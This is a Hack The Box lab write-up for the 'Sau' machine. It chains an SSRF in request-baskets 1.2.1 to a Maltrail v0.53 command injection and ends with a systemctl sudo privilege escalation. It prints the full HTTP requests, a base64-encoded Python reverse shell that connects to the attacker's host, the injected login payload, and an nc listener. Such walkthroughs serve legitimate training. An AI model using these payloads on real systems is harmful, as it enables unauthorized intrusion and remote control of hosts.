---
title:  "HTB Sau Writeup"
date:   2024-01-06 00:30:00 
categories: HTB Machine
tags: SSRF CVE-2023–27163 maltrail request-baskets sudo_abuse
---

![Sau](/assets/img/Sau/1688659208347.jpg)

## Introduction 

Sau was a very easy machine that relied on chaining multiple pubicly known vulnerabilities till you reach code execution. The privesc method was also fairly trivial using one of the easiest privesc methods possible. This box is nice for a beginner or for refreshing some of the basics.

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.10.11.224
```
**Nmap**
```
# Nmap 7.94 scan initiated Sat Dec 16 13:00:43 2023 as: nmap -sS -A -p- -o nmap 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (0.057s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 16 Dec 2023 18:01:34 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 16 Dec 2023 18:01:06 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 16 Dec 2023 18:01:07 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94%I=7%D=12/16%Time=657DE5E2%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sat,\x2016\x20Dec\x2
SF:02023\x2018:01:06\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/
SF:web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x20
SF:200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sat,\x2016\x20Dec\x2
SF:02023\x2018:01:07\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Option
SF:s:\x20nosniff\r\nDate:\x20Sat,\x2016\x20Dec\x202023\x2018:01:34\x20GMT\
SF:r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20na
SF:me\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$
SF:\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/16%OT=22%CT=1%CU=34996%PV=Y%DS=2%DC=T%G=Y%TM=657DE6
OS:47%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST
OS:11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   92.22 ms 10.10.16.1
2   22.82 ms 10.10.11.224

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 16 13:02:47 2023 -- 1 IP address (1 host up) scanned in 124.33 seconds
```

When reviewing the Nmap output two things are noteworthy. There are two ports open one being ssh and a web service on port **5555**. The second thing is that two ports are filtered (**80** and **8338**) This most of the time means that there is a service there but its just not reachable from our current location on the network. In short we might be able to reach these if we were able to reach these is our requets were being sent from localhost.

Lets first check out web page on port **5555**, When looking at this page we can see it doesn't have a huge amount of functionality we can make a request basket which at first sight doesn't do much. Though the front page does disclose that version **1.2.1** is being used which has a publicly known vulnerability under [CVE-2023–27163](https://vulners.com/cve/CVE-2023-27163). This vulnerability is an SSRF vulnerability which allows us to send requests using the request basket kind of as a proxy service. For more info on this please look at this [proof of conecept](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)

![Rquest baskets](/assets/img/Sau/Sau_01.png)


So knowing that this version might be vulnerable to a SSRF attack and there were two ports filtered it gave me the idea of trying to reach one of those ports. Send the following request to create a basket that connects to the service on port **8338**.

```
POST /api/baskets/Calico HTTP/1.1
Host: 10.10.11.224:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: null
X-Requested-With: XMLHttpRequest
Origin: http://10.10.11.224:55555
Connection: close
Referer: http://10.10.11.224:55555/web
Content-Length: 122

{"forward_url": "http://127.0.0.1:8338/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
```

The server then issued the following valid response showing our basket had been created

```
HTTP/1.1 201 Created
Content-Type: application/json; charset=UTF-8
Date: Sat, 16 Dec 2023 19:14:56 GMT
Content-Length: 56
Connection: close

{"token":"OpPvaYiJioOGZOgdvIGhqvZf6bcDplQnheUNZPQJ6gnh"}
```

Then if we were to browse to the following URL we'd see the main page of a service called **Maltrail** using version **v0.53**

```
http://10.10.11.224:55555/Calico
```


![Maltrail](/assets/img/Sau/Sau_02.png)


So when looking into this service version it also contains a [publicly known vulnerability](https://packetstormsecurity.com/files/174221/Maltrail-0.53-Unauthenticated-Command-Injection.html) in this case an unauthenticated remote code execution. This vulnerability basically allows for injecting arbitary OS commands by supplying a **;** symbol before your linux shell commands.  So first of all i'll prepare my shell command. My usually venue is to base64 encode a bash reverse shell. This however did not work on this box so i tried a few different shells. The python version did work. I decided to base64 encode t

```
echo -n "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.67",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")" | base64

```

After base64 encoding this payload we'd get the following string.
```
cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjY3Iiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
```

Then using this B64 string our payload will look like this:

```bash
echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjY3Iiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw== | base64 --decode | bash
```

Next setup your listener so that whenever we run this command we are ready to catch the reverse shell.

```
nc -lvp 443
```

So now that we have our payload ready we need to create a new request basket to be able to acess the login page.

```
POST /api/baskets/Calico1 HTTP/1.1
Host: 10.10.11.224:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: null
X-Requested-With: XMLHttpRequest
Origin: http://10.10.11.224:55555
Connection: close
Referer: http://10.10.11.224:55555/web
Content-Length: 127

{"forward_url": "http://127.0.0.1:8338/login","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
```

The server then issued the following valid response showing our basket was reachable from **Calico1**

```
HTTP/1.1 201 Created
Content-Type: application/json; charset=UTF-8
Date: Sat, 16 Dec 2023 19:49:58 GMT
Content-Length: 56
Connection: close

{"token":"vI4VZ0e8EtrKnQ-pkV7K8AmRZoTloxcQDdhS58NN5ixf"}
```

So now we have all the pieces we need we can exploit this service using the following request.

```
POST /Calico1 HTTP/1.1
Host: 10.10.11.224:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 326

username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjY3Iiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw== | base64 -d |sh`
```

Then a moment later our reverse shell would spring into action

![Reverse shell](/assets/img/Sau/Sau_03.png)

## Privilege escalation

The next step is to escalate our privileges. On this machine it was fairly easy because when we check what services our user can execute as sudo we can see it allowed us to run **/usr/bin/systemctl status trail.service**. systemctl is one of the [GTFO bins](https://gtfobins.github.io/gtfobins/systemctl/) which are easy to exploit.

```bash
sudo -l
```

![Sudo -l](/assets/img/Sau/Sau_04.png)


So we can exploit this by running the service and then doing **!sh**.

```bash
sudo /usr/bin/systemctl status trail.service
```

![Sudo -l](/assets/img/Sau/Sau_05.png)
